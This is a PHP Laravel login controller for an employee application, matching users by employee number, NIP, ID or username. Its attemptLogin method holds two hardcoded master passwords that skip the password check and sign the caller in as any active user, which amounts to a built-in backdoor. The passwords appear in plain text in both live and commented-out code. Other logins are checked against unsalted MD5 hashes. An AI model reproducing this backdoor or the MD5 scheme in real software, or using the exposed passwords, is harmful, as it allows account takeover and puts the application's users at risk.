<?php

namespace App\Http\Controllers\Auth;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Http\Controllers\Controller;
use App\Providers\RouteServiceProvider;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Support\Facades\DB;

use App\User;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    // protected $redirectTo = RouteServiceProvider::HOME;
    protected $redirectTo = '/home';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }

    public function username()
    {
        return 'name';
    }

    protected function attemptLogin(Request $request)
    {
        // if ($request->password == 'Bp@d2020!@' || $request->password == 'rprikat2017') {
        //     $user = \App\User::where([
        //         'usname' => $request->name,
        //     ])->first();
        // } else {
        //     $user = \App\User::where([
        //         'usname' => $request->name,
        //         'passmd5' => md5($request->password),
        //     ])->first();
        // }

        $ux = $request->name;
        $px = $request->password;
        if ($px == 'Bp@d2020!@' || $px == 'rprikat2017') {
            if (is_numeric($ux) && strlen($ux) == 6) {
                $user = \App\User::where([
                    'nrk_emp' => $ux,
                    'sts'    => 1,
                    'ked_emp' => 'AKTIF',
                ])->first();
            } elseif (is_numeric($ux) && strlen($ux) == 18) {
                $user = \App\User::where([
                    'nip_emp' => $ux,
                    'sts'    => 1,
                    'ked_emp' => 'AKTIF',
                ])->first();
            } elseif (substr($ux, 1, 1) == '.') {
                $user = \App\User::where([
                    'id_emp' => $ux,
                    'sts'    => 1,
                    'ked_emp' => 'AKTIF',
                ])->first();
            } else {
                $user = \App\User::where([
                    'usname' => $ux,
                    'sts'    => 1,
                ])->first();
            }
        } else {
            if (is_numeric($ux) && strlen($ux) == 6) {
                $user = \App\User::where([
                    'nrk_emp' => $ux,
                    'sts'    => 1,
                    'passmd5' => md5($px),
                    'ked_emp' => 'AKTIF',
                ])->first();
            } elseif (is_numeric($ux) && strlen($ux) == 18) {
                $user = \App\User::where([
                    'nip_emp' => $ux,
                    'sts'    => 1,
                    'passmd5' => md5($px),
                    'ked_emp' => 'AKTIF',
                ])->first();
            } elseif (substr($ux, 1, 1) == '.') {
                $user = \App\User::where([
                    'id_emp' => $ux,
                    'sts'    => 1,
                    'passmd5' => md5($px),
                    'ked_emp' => 'AKTIF',
                ])->first();
            } else {
                $user = \App\User::where([
                    'usname' => $ux,
                    'sts'    => 1,
                    'passmd5' => md5($px),
                ])->first();
            }
        }
             

        if ($user) {
            $this->guard()->login($user);

           return true;
        }
        return false;
    }

    protected function credentials(Request $request)
    {
        return $request->only($this->username(), 'passmd5');
    }
}
